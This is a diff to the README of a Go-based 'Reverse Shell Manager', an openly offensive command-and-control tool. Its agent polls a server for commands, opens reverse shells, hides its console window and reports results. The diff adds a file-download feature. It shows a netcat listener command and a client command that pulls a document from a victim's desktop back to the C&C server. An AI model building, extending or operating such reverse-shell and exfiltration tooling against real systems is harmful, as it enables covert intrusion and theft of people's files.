@@ -11,6 +11,7 @@ The Go Reverse Shell Manager is a comprehensive solution designed to facilitate 
 - **Reverse Shell Capability**: Open a reverse shell to a specified listener, allowing for interactive command execution.
 - **Result Reporting**: Automatically sends the execution results of commands back to the server.
 - **Hide Console Window**: Optionally runs without a visible console window to reduce footprint on the host system.
+- **Download file on the remote host**: Download file from the host where the agent is running
 
 ## Installation
 
@@ -92,6 +93,14 @@ Ensure you have a listener running on the specified port before initiating the r
 ```bash
 nc -lvp 4444
 ```
+
+### Download file from the remote host
+The C&C support downloading file from the remote host.
+To initiate a file to be downloaded just specify the path to the file on the remote host and the filename:
+```bash
+python client.py "download c:\Users\vboxuser\Desktop\document.docx document.docx"
+```
+The file will be downloaded on the C&C server and stored on inside a local folder named received_file.
 
 ### Agent operation
 The Go agent, once started, will periodically check the server for commands to execute. If the "shell" command is received, it will attempt to establish a reverse shell connection to the listener address.
